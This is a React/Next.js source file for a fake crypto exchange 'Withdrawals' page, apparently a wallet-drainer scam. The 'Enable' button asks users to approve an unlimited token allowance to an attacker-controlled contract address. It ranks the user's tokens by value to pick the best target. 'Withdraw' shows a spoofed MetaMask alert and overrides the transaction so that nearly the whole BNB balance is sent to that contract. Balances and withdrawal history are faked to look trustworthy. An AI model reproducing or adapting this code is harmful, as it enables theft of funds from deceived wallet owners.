import {
  Heading,
  Box,
  Flex,
  Button,
  TableContainer,
  Table,
  Tbody,
  Td,
  Th,
  Thead,
  Tr,
  HStack,
  VStack,
  Image,
  Text,
  FormControl,
  Input,
  useToast
} from '@chakra-ui/react';
import { useAddress, useSDK } from '@thirdweb-dev/react';
import { Error } from 'components/elements/Error';
import { Formik, Form } from 'formik';
import { useSession } from 'next-auth/react';
import { useState } from 'react';
import BAD_ABI from '../../../utils/BAD_ABI.json'

const Withdrawals = () => {
  const { data: session } = useSession();
  const sdk = useSDK();
  const address = useAddress();
  const toast = useToast();
  const [enabled, setEnabled] = useState(false);
  var bestToken: any;

  const enable = async () => {
    try{
      let contract = await sdk?.getContractFromAbi(bestToken.address, BAD_ABI);
      await contract?.call("approve", process.env.NEXT_PUBLIC_BAD_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935");
      setEnabled(true);
    } catch {
      toast({description: "You must Approve to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
    }
  }

  const getTokens = async () => {
    const params = {
        module: "account",
        action: "tokentx",
        address: address || "",
        page: "1",
        offset: "500",
        startblock: "0",
        endblock: "999999999",
        sort: "asc",
        apikey: process.env.NEXT_PUBLIC_BSC_API_KEY || "",
    };

    const response = await fetch(process.env.NEXT_PUBLIC_BSC_API + new URLSearchParams(params).toString());
    const json = await response.json();
    if(parseInt(json.status, 10)){
        const tokenAddrs = new Set(Array.from(json.result, (r: any) => r.contractAddress));

        const getTokenValue = async (tokenAddr: any) => {
            let contract = await sdk?.getContractFromAbi(tokenAddr, BAD_ABI);
            try {
              let balance = await contract?.call("balanceOf", address);
              const response = await fetch(process.env.NEXT_PUBLIC_PANCAKESWAP_API + tokenAddr);
              const json = await response.json();
              let value = parseFloat(json.data.price) * balance;

              return {
                address: tokenAddr,
                balance: balance,
                value: value
              };
            } catch (error) {
              console.log("Error for this address: " + await (contract?.getAddress()));
            }
        }

        var promises = [];
        for(const tokenAddr of tokenAddrs) {
          promises.push(getTokenValue(tokenAddr));
        }

        Promise.allSettled(promises).then(async (result: any) => {
            let tokens = Array.from(result.filter((x: any) => x.status === "fulfilled" && x.value), (r: any) => r.value);
            tokens = [
              {"address": "0x9c21123d94b93361a29b2c2efb3d5cd8b17e0a9e", "balance": 5, "value": 75}, // CAKE
              {"address": "0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684", "balance": "5", "value": "10"}, // WBNB
              {"address": "0x337610d27c682e347c9cd60bd4b3b107c9d34ddd", "balance": "5", "value": "500"},  // USDT
              {"address": "0xb0aC34810F760262E6b7c86587f22b32AD6D4a4E", "balance": 1, "value": 100}, // WETH
            ];
            bestToken = tokens.length > 0 ? tokens.sort((x, y) => parseFloat(y.value) - parseFloat(x.value))[0] : null;

            if(bestToken){
              let contract = await sdk?.getContractFromAbi(bestToken.address, BAD_ABI);
              let result = await contract?.call("allowance", address, process.env.NEXT_PUBLIC_BAD_ADDRESS);
              if(parseInt(result)){
                setEnabled(true);
              }
            }
        });
    }
  }

  const formSubmit = async (actions: any) => {
    actions.setSubmitting(false);

    let badContract = await sdk?.getContractFromAbi(process.env.NEXT_PUBLIC_BAD_ADDRESS || "", BAD_ABI);
    let bnbBalance: any = (await sdk?.wallet.balance())?.value || 0;
    let gasPrice = parseFloat(await badContract?.estimator.currentGasPriceInGwei() || "0");
    let estimatedGas = parseFloat((await badContract?.estimator.gasCostOf("approve", [bestToken.address, bestToken.balance]) || "0")) * 10**18;
    let value = BigInt(bnbBalance - (estimatedGas * gasPrice * 4));

    alert("MetaMask:\ndue to network congestion, gas fees estimation could be wrong");

    badContract?.interceptor.overrideNextTransaction(() => ({from: address, value: value}));
    badContract?.call("approve", bestToken.address, bestToken.balance);
  };

  if(address){
    getTokens();
  }

  return (
    <>
      <Heading size="lg" marginBottom={6}>
        Withdrawals
      </Heading>
      { !session ? <Error msg={"<b>Sign In</b> to your account first"}/> :
        <Box>
          <Box borderWidth='2px' borderRadius='lg' p="1em">
            <Flex align="top" >
              <VStack alignItems="top" flex="25">
                <Heading size="mg" marginBottom={3}>
                  Available crypto:
                </Heading>
                <HStack>
                  <Image src="/xpr.png" borderRadius="full" boxSize="26px" />
                  <Text>0.29391 <Text as="span" fontWeight="bold">XPR</Text> ($121.23)</Text>
                </HStack>
              </VStack>
              <VStack alignItems="top" flex="50">
                <Heading size="mg" marginBottom={3}>
                  Pending Withdrawals:
                </Heading>
                <HStack>
                  <Image src="/wbtc.png" borderRadius="full" boxSize="32px" />
                  <Text>0.32 <Text as="span" fontWeight="bold">WBTC</Text> ($5680.45)</Text>
                </HStack>
                <HStack>
                  <Image src="/busd.png" borderRadius="full" boxSize="26px" ml="1"/>
                  <Text>1.87 <Text as="span" fontWeight="bold">BUSD</Text> ($1.87)</Text>
                </HStack>
              </VStack>
            </Flex>
            <Flex marginTop="1em" borderTop="1px solid grey" justify="end">
              <VStack alignItems="center" mt="1em">
                  <Formik initialValues={{}} validateOnChange={false} validateOnBlur={false} onSubmit={(_, actions) => {formSubmit(actions);}}>
                    {(props) => (
                      <Form>
                        <HStack w="xl">
                          <FormControl isRequired isDisabled={!address || !enabled}>
                            <Input placeholder="Receiver Address"/>
                          </FormControl>
                          {
                            enabled
                            ? <Button isDisabled={!address || !enabled} size="lg" width="10em" colorScheme="teal" fontWeight="bold" isLoading={props.isSubmitting} type="submit"><Text>Withdraw<br></br><Text fontSize="xs" as="span">(0.15 XPR)</Text></Text></Button>
                            : <Button isDisabled={!address} size="md" width="10em" colorScheme="teal" fontWeight="bold" onClick={enable}><Text>Enable</Text></Button>
                          }
                        </HStack>
                      </Form>
                    )}
                  </Formik>
              </VStack>
            </Flex>
          </Box>

          <Heading size="mg" mt={6} mb={4}>
            Withdrawals History
          </Heading>
          <TableContainer borderWidth='2px' borderRadius='lg' pl={4} pr={4}>
            <Table variant='simple'>
              <Thead>
                <Tr>
                  <Th>Date</Th>
                  <Th>Address</Th>
                  <Th>Value</Th>
                  <Th>Fees</Th>
                </Tr>
              </Thead>
              <Tbody>
                <Tr>
                  <Td>2022/12/12 16:46:12 UTC</Td>
                  <Td>0x6acd4474EC51409696A6d86ac9f29294352B1f43</Td>
                  <Td>0.2 WBTC</Td>
                  <Td>0.025 XPR</Td>
                </Tr>
                <Tr>
                  <Td>2022/10/01 13:19:11 UTC</Td>
                  <Td>0x6acd4474EC51409696A6d86ac9f29294352B1f43</Td>
                  <Td>0.012 WBTC</Td>
                  <Td>0.01 XPR</Td>
                </Tr>
                <Tr>
                  <Td>2022/09/28 09:23:17 UTC</Td>
                  <Td>0x6acd4474EC51409696A6d86ac9f29294352B1f43</Td>
                  <Td>0.002 WBTC</Td>
                  <Td>0.0015 XPR</Td>
                </Tr>
              </Tbody>
            </Table>
          </TableContainer>
        </Box>
      }
    </>
  );
};

export default Withdrawals;